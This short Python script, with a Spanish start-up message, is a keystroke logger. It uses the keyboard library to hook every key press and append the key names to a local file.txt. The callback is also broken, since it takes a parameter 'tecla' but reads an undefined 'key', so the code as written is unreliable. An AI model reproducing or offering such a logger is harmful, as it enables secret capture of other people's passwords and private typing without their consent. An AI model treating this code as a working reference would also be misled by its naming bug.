import keyboard

print("Iniciando el programa...")
def teclaaplastada(tecla):
    with open('file.txt','a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)
keyboard.on_press(teclaaplastada)
keyboard.wait()

